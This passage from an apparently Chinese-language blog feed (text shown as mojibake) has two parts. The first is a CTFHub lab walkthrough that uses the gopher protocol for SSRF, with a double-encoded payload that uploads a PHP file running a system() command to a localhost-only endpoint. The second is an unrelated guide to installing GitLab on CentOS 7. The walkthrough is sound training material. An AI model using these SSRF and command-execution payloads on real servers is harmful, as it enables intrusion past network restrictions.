<p>è¯¥åè®®å¯ä»¥å‘é€<code>get</code>å’Œ<code>post</code>è¯·æ±‚ï¼Œä¸è¿‡åœ¨æ­¤ä¹‹å‰ï¼Œæˆ‘ä»¬åº”è¯¥å…ˆæ„é€ ç›¸åº”çš„æ•°æ®åŒ…ï¼Œç„¶åè¿›è¡Œ<code>URL</code>ç¼–ç ï¼ŒåŒæ—¶ç”¨<code>%0d%0a</code>æ›¿æ¢å›è½¦æ¢è¡Œç¬¦ï¼Œè€Œä¸”ä½¿ç”¨è¯¥åè®®çš„æ—¶å€™ï¼Œ<code>ip</code>åœ°å€åé¢è¦è·Ÿä¸Šä¸€ä¸ªç«¯å£å·ã€‚</p>
<h2 id="å¤ç°"><a href="#å¤ç°" class="headerlink" title="å¤ç°"></a>å¤ç°</h2><p>åœ¨windowsç«¯å¼€å¯ä¸€ä¸ª<code>nc</code>ç›‘å¬ï¼ˆåœ¨æ­¤ä¹‹å‰ï¼Œä½ åº”è¯¥å…ˆå®‰è£…ï¼‰</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -p -l 9999</span><br></pre></td></tr></table></figure>

<p>ç„¶ååœ¨kali linuxä¸­é€šè¿‡<code>gopher</code>åè®®è®¿é—®è¯¥ç«¯å£.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl gopher://192.168.1.120:8989/hello_yalexin</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬ä¼šåœ¨Windowsç«¯æ”¶åˆ°ä¿¡æ¯:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ello_yalexin</span><br></pre></td></tr></table></figure>

<p>æ­£å¦‚ä½ æ‰€è§ï¼Œå¯ä»¥æ”¶åˆ°ä¿¡æ¯ï¼Œä¸è¿‡ç¬¬ä¸€ä¸ªå­—ç¬¦å¹¶æ²¡æœ‰æ”¶åˆ°ã€‚</p>
<p><img src="https://cdn.yalexin.top/image-20220629142405790.png" alt="image-20220629142405790"></p>
<h3 id="å‘é€GETè¯·æ±‚"><a href="#å‘é€GETè¯·æ±‚" class="headerlink" title="å‘é€GETè¯·æ±‚"></a>å‘é€GETè¯·æ±‚</h3><p>åœ¨Windowsç«¯å…ˆå‡†å¤‡ä¸€ä¸ª<code>test.php</code>æ–‡ä»¶ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"Hello ,"</span>.$_GET[<span class="string">"name"</span>].<span class="string">"!"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä¸€ä¸ªå¸¸è§çš„<code>GET</code>è¯·æ±‚<code>HTTP</code>åŒ…å¦‚ä¸‹ï¼š</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/test.php?name=yalexin</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.1.28</span><br></pre></td></tr></table></figure>

<p>å‘é€ä¹‹å‰æˆ‘ä»¬éœ€è¦å°†å…¶è¿›è¡Œ<code>URL</code>ç¼–ç ï¼Œä½ å¯ä»¥ä½¿ç”¨å¾ˆå¤šåœ¨çº¿å·¥å…·å®Œæˆã€‚</p>
<p>äººç”Ÿè‹¦çŸ­ï¼Œæˆ‘ç”¨<code>python</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># parse.py</span></span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line">payload =\</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">GET test.php?name=yalexin HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 192.168.1.28</span></span><br><span class="line"><span class="string">"""</span> </span><br><span class="line">urlStr = urllib.parse.quote(payload)</span><br><span class="line"><span class="comment"># æ³¨æ„è¦ç”¨ %0D%0A ä»£æ›¿å›è½¦æ¢è¡Œ</span></span><br><span class="line">urlStr = urlStr.replace(<span class="string">'%0A'</span>,<span class="string">'%0D%0A'</span>)</span><br><span class="line">print(urlStr)</span><br></pre></td></tr></table></figure>

<p>åœ¨<code>kali</code>ä¸­å‘é€ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl gopher://192.168.1.28:80/GET%20/test.php%3Fname%3Dyalexin%20HTTP/1.1%0D%0AHost%3A%20192.168.1.28%0D%0A</span><br></pre></td></tr></table></figure>

<h3 id="å‘é€POSTè¯·æ±‚"><a href="#å‘é€POSTè¯·æ±‚" class="headerlink" title="å‘é€POSTè¯·æ±‚"></a>å‘é€POSTè¯·æ±‚</h3><p>å‡†å¤‡ä¸€ä¸ª<code>post.php</code>ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"Hello ,"</span>.$_POST[<span class="string">"name"</span>].<span class="string">"!"</span>.<span class="string">"\n"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>POST</code>çš„<code>HTTP</code>åŒ…æ ¼å¼ä¸ºï¼š</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/post.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">host:192.168.1.120</span></span><br><span class="line"><span class="attribute">Content-Type:application/x-www-form-urlencoded</span></span><br><span class="line"><span class="attribute">Content-Length:12</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line">name=yalexin</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨è„šæœ¬ç¼–ç åå†å‘é€è¯·æ±‚ï¼š</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">curl gopher://192.168.1.28:80/POST%20/post.php%20HTTP/1.1%0D%0Ahost%3A192.168.1.28%0D%0AContent-Type%3Aapplication/x-www-form-urlencoded%0D%0AContent-Length%3A12%0D%0A%0D%0Aname%3Dyalexin%0D%0A</span><br></pre></td></tr></table></figure>

<h2 id="å®æˆ˜"><a href="#å®æˆ˜" class="headerlink" title="å®æˆ˜"></a>å®æˆ˜</h2><p>ä»¥<a href="https://www.ctfhub.com/#/skilltree" target="_blank" rel="noopener">ctfhubæŠ€èƒ½æ ‘</a>çš„SSRFçš„ä¸Šä¼ æ–‡ä»¶ä¸ºä¾‹ã€‚</p>
<p>æˆ‘ä»¬å…ˆçœ‹ä¸€ä¸‹æºç ï¼š</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">?url=file:///var/www/html/flag.php</span><br></pre></td></tr></table></figure>

<p>è¿”å›å†…å®¹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">"REMOTE_ADDR"</span>] != <span class="string">"127.0.0.1"</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Just View From 127.0.0.1"</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_FILES[<span class="string">"file"</span>]) &amp;&amp; $_FILES[<span class="string">"file"</span>][<span class="string">"size"</span>] &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> getenv(<span class="string">"CTFHUB"</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">Upload Webshell</span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">"/flag.php"</span> method=<span class="string">"post"</span> enctype=<span class="string">"multipart/form-data"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"file"</span> name=<span class="string">"file"</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬å¯ä»¥å‘ç°åªèƒ½ä»127.0.0.1ä¸­è®¿é—®è¯¥è„šæœ¬ï¼Œä¸”å¿…é¡»ä¸Šä¼ ä¸€ä¸ªéç©ºæ–‡ä»¶åæ‰å¯ä»¥æ‹¿åˆ°<code>flag</code></p>
<p>æˆ‘ä»¬å¯ä»¥å…ˆè®¿é—®ä¸€ä¸‹è¯¥è„šæœ¬ï¼š</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">?url=127.0.0.1/flag.php</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯æˆ‘ä»¬å‘ç°æ— æ³•æäº¤è¡¨å•ï¼Œä½†æ˜¯ä¸è¦ç´§ï¼Œæˆ‘ä»¬åœ¨æµè§ˆå™¨ä¸­æ‰‹åŠ¨æ·»åŠ æäº¤æŒ‰é’®å³å¯ï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>æäº¤ä¸€ä¸ªæ–‡ä»¶åå‘ç°å‡ºé”™ï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">Just View From 127.0.0.1</span><br></pre></td></tr></table></figure>

<p>çœ‹æ¥è¦å€ŸåŠ©<code>gopher</code>åè®®äº†</p>
<p>åœ¨æ­¤ä¹‹å‰ï¼Œæˆ‘ä»¬å€ŸåŠ©burpsuiteè¿›è¡ŒæŠ“åŒ…ï¼ˆé‡å¤åˆšåˆšçš„æäº¤æ–‡ä»¶åŠ¨ä½œï¼‰</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/flag.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: challenge-a989adeace7e1bf9.sandbox.ctfhub.com:10800</span><br><span class="line"><span class="attribute">Content-Length</span>: 340</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Origin</span>: http://challenge-a989adeace7e1bf9.sandbox.ctfhub.com:10800</span><br><span class="line"><span class="attribute">Content-Type</span>: multipart/form-data; boundary=----WebKitFormBoundaryy4kNDjSQVdU1NViJ</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Referer</span>: http://challenge-a989adeace7e1bf9.sandbox.ctfhub.com:10800/?url=127.0.0.1/flag.php</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryy4kNDjSQVdU1NViJ</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="file"; filename="find.php"</span><br><span class="line"><span class="attribute">Content-Type</span>: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">system('find / -name *flag*');</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">------WebKitFormBoundaryy4kNDjSQVdU1NViJ</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="submit"</span><br><span class="line"></span><br><span class="line">é»æ„ªæ°¦</span><br><span class="line">------WebKitFormBoundaryy4kNDjSQVdU1NViJ--</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨æˆ‘ä»¬çš„è„šæœ¬<code>parse.py</code>ä¹‹å‰ï¼Œæˆ‘ä»¬åº”è¯¥å°†ä¸Šè¿°æ•°æ®åŒ…ä¸­çš„<code>Host</code>æ”¹ä¸º<code>127.0.0.1</code></p>
<p>ï¼Œç”±äºæµè§ˆå™¨ä¼šè‡ªåŠ¨URLè§£ç ä¸€æ¬¡ï¼Œå› æ­¤æˆ‘ä»¬è¿˜åº”è¯¥å†URLç¼–ç ä¸€æ¬¡ï¼Œå³ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line">payload =\</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">POST /flag.php HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">Content-Length: 340</span></span><br><span class="line"><span class="string">Cache-Control: max-age=0</span></span><br><span class="line"><span class="string">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="string">Origin: http://challenge-a989adeace7e1bf9.sandbox.ctfhub.com:10800</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryy4kNDjSQVdU1NViJ</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span></span><br><span class="line"><span class="string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span><br><span class="line"><span class="string">Referer: http://challenge-a989adeace7e1bf9.sandbox.ctfhub.com:10800/?url=127.0.0.1/flag.php</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="string">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">------WebKitFormBoundaryy4kNDjSQVdU1NViJ</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name="file"; filename="find.php"</span></span><br><span class="line"><span class="string">Content-Type: application/octet-stream</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">system('find / -name *flag*');</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string">------WebKitFormBoundaryy4kNDjSQVdU1NViJ</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name="submit"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">é»æ„ªæ°¦</span></span><br><span class="line"><span class="string">------WebKitFormBoundaryy4kNDjSQVdU1NViJ--</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"""</span> </span><br><span class="line">urlStr = urllib.parse.quote(payload)</span><br><span class="line"><span class="comment"># æ³¨æ„è¦ç”¨ %0D%0A ä»£æ›¿å›è½¦æ¢è¡Œ</span></span><br><span class="line">urlStr = urlStr.replace(<span class="string">'%0A'</span>,<span class="string">'%0D%0A'</span>)</span><br><span class="line"><span class="comment"># å†æ¬¡ç¼–ç </span></span><br><span class="line">urlStr = urllib.parse.quote(urlStr)</span><br><span class="line">print(urlStr)</span><br></pre></td></tr></table></figure>

<p>ä¼ªé€ å¦‚ä¸‹è¯·æ±‚æ•°æ®ï¼š</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">POST%2520/flag.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Length%253A%2520340%250D%250ACache-Control%253A%2520max-age%253D0%250D%250AUpgrade-Insecure-Requests%253A%25201%250D%250AOrigin%253A%2520http%253A//challenge-a989adeace7e1bf9.sandbox.ctfhub.com%253A10800%250D%250AContent-Type%253A%2520multipart/form-data%253B%2520boundary%253D----WebKitFormBoundaryy4kNDjSQVdU1NViJ%250D%250AUser-Agent%253A%2520Mozilla/5.0%2520%2528Windows%2520NT%252010.0%253B%2520Win64%253B%2520x64%2529%2520AppleWebKit/537.36%2520%2528KHTML%252C%2520like%2520Gecko%2529%2520Chrome/103.0.0.0%2520Safari/537.36%250D%250AAccept%253A%2520text/html%252Capplication/xhtml%252Bxml%252Capplication/xml%253Bq%253D0.9%252Cimage/avif%252Cimage/webp%252Cimage/apng%252C%252A/%252A%253Bq%253D0.8%252Capplication/signed-exchange%253Bv%253Db3%253Bq%253D0.9%250D%250AReferer%253A%2520http%253A//challenge-a989adeace7e1bf9.sandbox.ctfhub.com%253A10800/%253Furl%253D127.0.0.1/flag.php%250D%250AAccept-Encoding%253A%2520gzip%252C%2520deflate%250D%250AAccept-Language%253A%2520zh-CN%252Czh%253Bq%253D0.9%250D%250AConnection%253A%2520close%250D%250A%250D%250A------WebKitFormBoundaryy4kNDjSQVdU1NViJ%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522file%2522%253B%2520filename%253D%2522find.php%2522%250D%250AContent-Type%253A%2520application/octet-stream%250D%250A%250D%250A%253C%253Fphp%250D%250A%250D%250Asystem%2528%2527find%2520/%2520-name%2520%252Aflag%252A%2527%2529%253B%250D%250A%250D%250A%253F%253E%250D%250A------WebKitFormBoundaryy4kNDjSQVdU1NViJ%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522submit%2522%250D%250A%250D%250A%25E9%258E%25BB%25E6%2584%25AA%25E6%25B0%25A6%250D%250A------WebKitFormBoundaryy4kNDjSQVdU1NViJ--%250D%250A%250D%250A</span></span><br></pre></td></tr></table></figure>

<p>æ„é€ Payloadï¼ˆ<strong>æ³¨æ„</strong>ï¼šgopheråè®®ä¼šå°†ç¬¬ä¸€ä¸ªå­—ç¬¦åæ‰ï¼Œè®°å¾—å¤šè¡¥ä¸€ä¸ªå­—ç¬¦ï¼‰ï¼š</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">?url=gopher://127.0.0.1:80/_POST%2520/flag.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Length%253A%2520340%250D%250ACache-Control%253A%2520max-age%253D0%250D%250AUpgrade-Insecure-Requests%253A%25201%250D%250AOrigin%253A%2520http%253A//challenge-a989adeace7e1bf9.sandbox.ctfhub.com%253A10800%250D%250AContent-Type%253A%2520multipart/form-data%253B%2520boundary%253D----WebKitFormBoundaryy4kNDjSQVdU1NViJ%250D%250AUser-Agent%253A%2520Mozilla/5.0%2520%2528Windows%2520NT%252010.0%253B%2520Win64%253B%2520x64%2529%2520AppleWebKit/537.36%2520%2528KHTML%252C%2520like%2520Gecko%2529%2520Chrome/103.0.0.0%2520Safari/537.36%250D%250AAccept%253A%2520text/html%252Capplication/xhtml%252Bxml%252Capplication/xml%253Bq%253D0.9%252Cimage/avif%252Cimage/webp%252Cimage/apng%252C%252A/%252A%253Bq%253D0.8%252Capplication/signed-exchange%253Bv%253Db3%253Bq%253D0.9%250D%250AReferer%253A%2520http%253A//challenge-a989adeace7e1bf9.sandbox.ctfhub.com%253A10800/%253Furl%253D127.0.0.1/flag.php%250D%250AAccept-Encoding%253A%2520gzip%252C%2520deflate%250D%250AAccept-Language%253A%2520zh-CN%252Czh%253Bq%253D0.9%250D%250AConnection%253A%2520close%250D%250A%250D%250A------WebKitFormBoundaryy4kNDjSQVdU1NViJ%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522file%2522%253B%2520filename%253D%2522find.php%2522%250D%250AContent-Type%253A%2520application/octet-stream%250D%250A%250D%250A%253C%253Fphp%250D%250A%250D%250Asystem%2528%2527find%2520/%2520-name%2520%252Aflag%252A%2527%2529%253B%250D%250A%250D%250A%253F%253E%250D%250A------WebKitFormBoundaryy4kNDjSQVdU1NViJ%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522submit%2522%250D%250A%250D%250A%25E9%258E%25BB%25E6%2584%25AA%25E6%25B0%25A6%250D%250A------WebKitFormBoundaryy4kNDjSQVdU1NViJ--%250D%250A%250D%250A</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.yalexin.top/image-20220629154916452.png" alt="image-20220629154916452"></p>
]]></content>
      <categories>
        <category>ç½‘ç»œæ”»é˜²</category>
      </categories>
      <tags>
        <tag>SSRF</tag>
      </tags>
  </entry>
  <entry>
    <title>Gitå­¦ä¹ ç¬”è®°ä¹‹æ­å»ºç§æœ</title>
    <url>/2022/02/12/Git%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E6%90%AD%E5%BB%BA%E7%A7%81%E6%9C%8D/</url>
    <content><![CDATA[<p>ä¹¦æ¥ä¸Šå›ï¼Œæœ¬æ–‡ä¸»è¦ä»‹ç»å¦‚ä½•æ­å»ºå±äºä½ è‡ªå·±çš„<code>Git</code>ç§æœã€‚</p>
<a id="more"></a>

<p>æˆ‘ä»¬ä¹‹å‰æ¼”ç¤ºäº†å¦‚ä½•ä½¿ç”¨ç¬¬ä¸‰æ–¹ä»£ç æ‰˜ç®¡å¹³å°<code>Github</code>æ¥ä½œä¸ºæˆ‘ä»¬è¿œç«¯ä»“åº“ï¼Œä¸è¿‡è™½ç„¶ä¹‹å‰<code>Github</code>å…è®¸å»ºç«‹ç§æœ‰ä»“åº“ï¼Œä½†æ˜¯å…è´¹çš„ä¹‹ä½™è¿˜æ˜¯æœ‰ä¸€äº›é™åˆ¶è¯¸å¦‚åä½œè€…äººæ•°ä¸èƒ½è¿‡å¤šï¼Œå†µä¸”æœ‰çš„æ—¶å€™æˆ‘ä»¬è§†ä»£ç å¦‚å‘½è„‰ï¼Œä¸æƒ³å¼€æºåˆæƒ³ä½¿ç”¨<code>Git</code>æ€ä¹ˆåŠï¼Ÿç­”æ¡ˆå°±æ˜¯æ­å»ºç§æœï¼æ­å»ºç§æœæœ‰å‡ ç§æ–¹å¼ï¼Œä¸‹é¢ä»‹ç»ä¸€ç§æ¯”è¾ƒæµè¡Œçš„ï¼Œä½†æ˜¯æ¯”è¾ƒå¤æ‚ã€‚</p>
<p>å‰ææç¤ºï¼šæˆ‘çš„<code>Linux</code>ç³»ç»Ÿæ˜¯<code>centos7</code>ã€‚</p>
<h2 id="å®‰è£…GitLab"><a href="#å®‰è£…GitLab" class="headerlink" title="å®‰è£…GitLab"></a>å®‰è£…GitLab</h2><p>å®‰è£…å‰æä¾èµ–ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo yum install -y curl policycoreutils-python openssh-server perl</span><br></pre></td></tr></table></figure>

<p> åœ¨ç³»ç»Ÿé˜²ç«å¢™ä¸­æ‰“å¼€ <code>HTTP</code>ã€<code>HTTPS</code>å’Œ <code>SSH</code>è®¿é—® ï¼ˆå¯é€‰ï¼Œä¸è®¾ç½®åˆ™åªèƒ½ä»æœ¬åœ°ç½‘ç»œè®¿é—® ï¼‰</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo systemctl enable sshd</span><br><span class="line">sudo systemctl start sshd</span><br><span class="line">sudo firewall-cmd --permanent --add-service=http</span><br><span class="line">sudo systemctl reload firewalld</span><br></pre></td></tr></table></figure>

<p> å®‰è£… <code>Postfix</code> ä»¥å‘é€ç”µå­é‚®ä»¶é€šçŸ¥ ï¼ˆå¯é€‰ï¼‰</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo yum install postfix</span><br><span class="line">sudo systemctl enable postfix</span><br><span class="line">sudo systemctl start postfix</span><br></pre></td></tr></table></figure>

<p>ä¸‹è½½<code>GitLab</code>å®‰è£…åŒ…</p>
<p>åˆ°ç½‘ç«™<a href="https://packages.gitlab.com/gitlab/gitlab-ce/ä¸‹è½½åˆé€‚çš„åŒ…" target="_blank" rel="noopener">https://packages.gitlab.com/gitlab/gitlab-ce/ä¸‹è½½åˆé€‚çš„åŒ…</a></p>
<blockquote>
<p>gitlab-ceæ˜¯ç¤¾åŒºç‰ˆï¼Œå…è´¹çš„<br>gitlab-eeæ˜¯ä¼ä¸šç‰ˆï¼Œæ”¶è´¹çš„</p>
</blockquote>
<p>æ‰¾åˆ°åˆé€‚çš„åŒ…åé¡µé¢å¾€ä¸‹æ»‘æ‰¾åˆ°<code>wget</code>çš„åœ°å€å¤åˆ¶ä¸‹æ¥åˆ°æœåŠ¡å™¨ä¸­ä¸‹è½½ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget --content-disposition https://packages.gitlab.com/gitlab/gitlab-ce/packages/el/7/gitlab-ce-14.7.2-ce.0.el7.x86_64.rpm/download.rpm</span><br></pre></td></tr></table></figure>

<p>ç„¶åå¼€å§‹å®‰è£…ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo rpm -Uvh gitlab-ce-14.7.2-ce.0.el7.x86_64.rpm</span><br></pre></td></tr></table></figure>

<p> å®‰è£…æˆåŠŸåçš„æç¤º:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Thank you for installing GitLab! GitLab was unable to detect a valid hostname for your instance. Please configure a URL for your GitLab instance by setting &#96;external_url&#96; configuration in &#x2F;etc&#x2F;gitlab&#x2F;gitlab.rb file. Then, you can start your GitLab instance by running the following command:  sudo gitlab-ctl reconfigure</span><br></pre></td></tr></table></figure>

<p>æŒ‰ç…§æç¤ºï¼Œæ‰“å¼€<code>/etc/gitlab/gitlab.rb</code>æ–‡ä»¶ï¼Œæœç´¢<code>external_url</code>é€‰é¡¹ï¼Œè®¾ç½®ä¸º<code>ip</code>åœ°å€ï¼ˆä¾‹å¦‚æˆ‘çš„ä¸º<a href="http://124.222.8.87:81/ï¼‰æˆ–è€…åŸŸååœ°å€" target="_blank" rel="noopener">http://124.222.8.87:81/ï¼‰æˆ–è€…åŸŸååœ°å€</a></p>
<p>ç„¶åé‡æ–°é…ç½®ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gitlab-ctl reconfigure</span><br></pre></td></tr></table></figure>

<p>ç„¶åå¼€å¯<code>gitlab</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gitlab-ctl start</span><br></pre></td></tr></table></figure>

<p>ç„¶åè®¿é—®ä¹‹å‰è®¾ç½®çš„<code>ip</code>åœ°å€</p>
<p><img src="https://qiniu.yalexin.top/gitlab-0.png" alt></p>
<p> ç”¨æˆ·åä¸º<code>root</code>ã€‚åˆå§‹å¯†ç æ˜¯åœ¨<code>/etc/gitlab/initial_root_password</code>ï¼Œä¸è¿‡è¯¥å¯†ç åœ¨æ‰§è¡Œ<code>reconfigreure</code>åçš„24å°æ—¶å°±ä¼šè¢«åˆ é™¤ï¼Œæ‰€ä»¥è®°æ€§ä¸å¥½çš„è¯å»ºè®®ç«‹å³æ”¹å¯†ç ã€‚</p>
<blockquote>
<p>å¦‚æœæ— æ³•è®¿é—®ï¼Œåˆ™å¯èƒ½æ˜¯æ²¡æœ‰å¼€æ”¾é˜²ç«å¢™ç«¯å£</p>
<p>ä¾æ¬¡æ‰§è¡Œä»¥ä¸‹å‘½ä»¤å³å¯ï¼š</p>
<p><code>firewall-cmd --zone=public --list-ports</code> #æŸ¥çœ‹å¼€æ”¾ç«¯å£<br><code>firewall-cmd --zone=public --add-port=81/tcp --permanent</code> #å¼€æ”¾81ç«¯å£<br><code>firewall-cmd --reload</code>   #é‡æ–°åŠ è½½é…ç½®<br>#å¦‚æœä¸éœ€è¦ï¼Œä¹Ÿå¯ä»¥ç›´æ¥å…³é—­é˜²ç«å¢™ï¼Œå‰ææ˜¯ä¸æ€•è¢«è¿ç»´çš„è¿½ç€æ‰“ï¼<br><code>systemctl stop firewalld.service</code></p>
</blockquote>
<p><strong>å¼ºçƒˆå»ºè®®æœåŠ¡å™¨è¿è¡Œå†…å­˜åœ¨2GBä»¥ä¸Šï¼ï¼</strong></p>
<p>æˆ‘çš„å­¦ç”ŸæœºçœŸçš„åªæœ‰2BGå†…å­˜ï¼Œè¿˜å¾—å¼€ä¸ª4GBçš„è™šæ‹Ÿå†…å­˜æ‰å‹‰å‹‰å¼ºå¼ºè¿è¡Œèµ·æ¥ã€‚</p>
<h2 id="æ³¨å†Œå¹¶ä½¿ç”¨GitLab"><a href="#æ³¨å†Œå¹¶ä½¿ç”¨GitLab" class="headerlink" title="æ³¨å†Œå¹¶ä½¿ç”¨GitLab"></a>æ³¨å†Œå¹¶ä½¿ç”¨GitLab</h2><p>æˆ‘å‘ç°2GBå®åœ¨æ˜¯ä¸èƒ½ç”¨ï¼Œåªå¥½æ–¥å·¨èµ„å‡ å—é’±åœ¨åä¸ºäº‘ä¸Šä¹°äº†å¼¹æ€§è®¡ç®—å‹ä¸»æœº~~</p>
<p>ç™»å½•åå°ä»¥åï¼Œå¯ä»¥è‡ªè¡Œé€‰æ‹©æ›´æ”¹è¯­è¨€ä¸ºç®€ä½“ä¸­æ–‡ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨é»˜è®¤çš„ã€‚</p>
<p>æ¥ä¸‹æ¥å°±åƒä½¿ç”¨<code>GitHub</code>ä¸€æ ·å•¦ï¼</p>
<p>å…ˆæ³¨å†Œæ™®é€šç”¨æˆ·ï¼Œå› ä¸ºä½ æ€»ä¸å¯èƒ½æ‰€æœ‰äººéƒ½ä½¿ç”¨<code>root</code>è´¦æˆ·å§ï¼</p>
<p><img src="https://qiniu.yalexin.top/gitlab-1.png" alt></p>
<p>æ³¨å†Œå¥½ä»¥åï¼Œç®¡ç†å‘˜åå°å®¡æ ¸å³å¯ã€‚</p>
<p><img src="https://qiniu.yalexin.top/gitlab-2.png" alt></p>
<p><img src="https://qiniu.yalexin.top/gitlab-4.png" alt></p>
